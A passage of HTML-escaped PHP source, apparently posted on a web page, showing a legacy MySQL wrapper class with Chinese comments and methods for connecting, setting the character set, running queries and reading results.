$dbhost,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;dbuser&#39;&nbsp;&nbsp; =&gt; $dbuser,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;dbpw&#39;&nbsp;&nbsp;&nbsp;&nbsp; =&gt; $dbpw,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;dbname&#39;&nbsp;&nbsp; =&gt; $dbname,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;charset&#39;&nbsp; =&gt; $charset,</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;pconnect&#39; =&gt; $pconnect</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function connect($dbhost, $dbuser, $dbpw, $dbname = &#39;&#39;, $charset = &#39;utf8&#39;, $pconnect = 0, $quiet = 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>//如果是永久连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($pconnect)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!($this-&gt;link_id = @mysql_pconnect($dbhost, $dbuser, $dbpw)))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$quiet)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;ErrorMsg(&quot;Can&#39;t pConnect MySQL Server($dbhost)!&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>//不是永久连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (PHP_VERSION &gt;= &#39;4.2&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;link_id = @mysql_connect($dbhost, $dbuser, $dbpw, true);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;link_id = @mysql_connect($dbhost, $dbuser, $dbpw);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mt_srand((double)microtime() * 1000000); // 对 PHP 4.2 以下的版本进行随机数函数的初始化工作</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$this-&gt;link_id)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$quiet)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;ErrorMsg(&quot;Can&#39;t Connect MySQL Server($dbhost)!&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;dbhash&nbsp; = md5($dbhost . $dbuser . $dbpw . $dbname);</p>\r\n\r\n<p>//获取mysql版本信息</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;version = mysql_get_server_info($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 如果mysql 版本是 4.1+ 以上，需要对字符集进行初始化 */</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;version &gt; &#39;4.1&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($charset != &#39;latin1&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql_query(&quot;SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary&quot;, $this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;version &gt; &#39;5.0.1&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql_query(&quot;SET sql_mode=&#39;&#39;&quot;, $this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;starttime = time();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 如果传入了数据库名则选择数据库 */</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($dbname)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (mysql_select_db($dbname, $this-&gt;link_id) === false )</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!$quiet)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;ErrorMsg(&quot;Can&#39;t select MySQL database($dbname)!&quot;);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//选择数据库</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function select_database($dbname)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_select_db($dbname, $this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//设置字符集</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function set_mysql_charset($charset)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 如果mysql 版本是 4.1+ 以上，需要对字符集进行初始化 */</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;version &gt; &#39;4.1&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (in_array(strtolower($charset), array(&#39;gbk&#39;, &#39;big5&#39;, &#39;utf-8&#39;, &#39;utf8&#39;)))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $charset = str_replace(&#39;-&#39;, &#39;&#39;, $charset);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($charset != &#39;latin1&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql_query(&quot;SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary&quot;, $this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function fetch_array($query, $result_type = MYSQL_ASSOC)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_fetch_array($query, $result_type);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function query($sql, $type = &#39;&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>//如果还没连接数据库则从配置属性中获取连接参数进行连接</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;link_id === NULL)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;connect($this-&gt;settings[&#39;dbhost&#39;], $this-&gt;settings[&#39;dbuser&#39;], $this-&gt;settings[&#39;dbpw&#39;], $this-&gt;settings[&#39;dbname&#39;], $this-&gt;settings[&#39;charset&#39;], $this-&gt;settings[&#39;pconnect&#39;]);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;settings = array();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//记录执行的前100条语句</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;queryCount++ &lt;= 99)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;queryLog[] = $sql;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($this-&gt;queryTime == &#39;&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (PHP_VERSION &gt;= &#39;5.0.0&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;queryTime = microtime(true);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;queryTime = microtime();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 当当前的时间大于类初始化时间的时候，自动执行 ping 这个自动重新连接操作 */</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (PHP_VERSION &gt;= &#39;4.3&#39; &amp;&amp; time() &gt; $this-&gt;starttime + 1)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql_ping($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//如果执行sql语句失败且不是沉默方式</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!($query = mysql_query($sql, $this-&gt;link_id)) &amp;&amp; $type != &#39;SILENT&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;error_message[][&#39;message&#39;] = &#39;MySQL Query Error&#39;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;error_message[][&#39;sql&#39;] = $sql;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;error_message[][&#39;error&#39;] = mysql_error($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;error_message[][&#39;errno&#39;] = mysql_errno($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//显示错误信息</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;ErrorMsg();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $query;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//取得前一次 MySQL 操作所影响的记录行数</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function affected_rows()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_affected_rows($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回上一个 MySQL 操作产生的文本错误信息</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function error()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_error($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回上一个 MySQL 操作中的错误信息的数字编码</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function errno()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_errno($this-&gt;link_id);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//返回 MySQL 结果集中一个单元的内容</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function result($query, $row)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return @mysql_result($query, $row);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//取得结果集中行的数目</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function num_rows($query)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_num_rows($query);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//取得结果集中字段的数目</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function num_fields($query)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return mysql_num_fields($query);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>//释放所有与结果标识符$query所关联的内存</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; function free_result($query)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 